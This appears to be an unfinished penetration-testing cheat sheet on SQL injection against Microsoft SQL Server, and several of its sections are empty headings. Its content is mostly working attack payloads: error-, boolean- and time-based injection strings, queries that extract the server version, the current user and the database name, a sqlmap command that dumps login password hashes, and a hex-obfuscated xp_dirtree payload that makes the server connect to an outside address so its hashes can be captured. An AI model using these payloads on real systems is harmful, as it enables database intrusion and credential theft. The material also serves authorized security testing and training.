# Web Application - SQL Injection - MSSQL

Microsoft SQL Server is a relational database management system developed by
Microsoft.  
Microsoft markets a dozen different editions of Microsoft SQL Server with various functionalities and aims. A list of the versions is available : https://support.microsoft.com/en-us/help/321185/how-to-determine-the-version-edition-and-update-level-of-sql-server-an

MSSQL supports stacked queries.

### RECON

###### Injection locations

In a HTTP request there are a few common injection points :
 - URL parameters
 - POST parameters
 - Cookie names and values
 - Host header and any custom headers

While these are the most common, any content in an HTTP request can be
vulnerable to SQL injection.

###### Injection detection

Detecting vulnerable parameters is most easily done by triggering errors and
boolean logic within the application.  
Supplying malformed queries will trigger errors and sending valid queries with
various boolean logic statements may trigger different responses from the web
server.  
Time based payload can also be used to detect SQL injection in MSSQL.  

| Technique      | Query     |
|----------------|-----------|
| Error <br /> *A direct message can be returned or the page may act differently*    | x='<br/> x=" |
| Logic Testing <br /> *Page can react differently if true or false* | x=1 or 1=1 *-- true* <br /> x=1' or 1=1 *-- true* <br/> x=1" or 1=1 *-- true* <br/> x=1 or 1=2 *-- false*  <br/>... |
| Time Based <br /> A delay can be induced by the query execution | x=1 WAITFOR DELAY '0:0:5' -- Wait 5 seconds <br /> x=1; WAITFOR DELAY '0:0:5' -- Wait 5 seconds <br />  x=1 WAITFOR TIME '22:42' -- Wait until 22:42 <br /> ... |

###### Automated detection

The detection of vulnerable parameters can be automated, using the BurpSuite
Pro scanner for example.

### EXPLOIT

###### Encoding queries


###### Obfuscating queries

###### Disable logging mechanisms

###### Meta information

**Description**

```sql
-- Union

-- Error
1 AND 68 IN (SELECT (CAST(@@version AS NVARCHAR(4000))))

-- Boolean


-- Time
```
###### Users and privileges

###### Databases

###### Tables

###### Columns

###### Data

Get current user
1 AND 68 IN (SELECT (CAST(SYSTEM_USER AS NVARCHAR(4000))))

Get current db name
1 AND 3995 IN (SELECT (CAST(DB_NAME() AS NVARCHAR(4000))))

SQLMAP Get password hash
sqlmap -D master -T sys.sql_logins --dump

1;DECLARE @fktn VARCHAR(8000);SET @fktn=0x5c5c31302e31302e31342e3133305c666f6f616161;EXEC master..xp_dirtree @fktn--

### POST-EXPLOIT

###### Commands execution

###### File system access

###### Hash exfiltration

###### Others
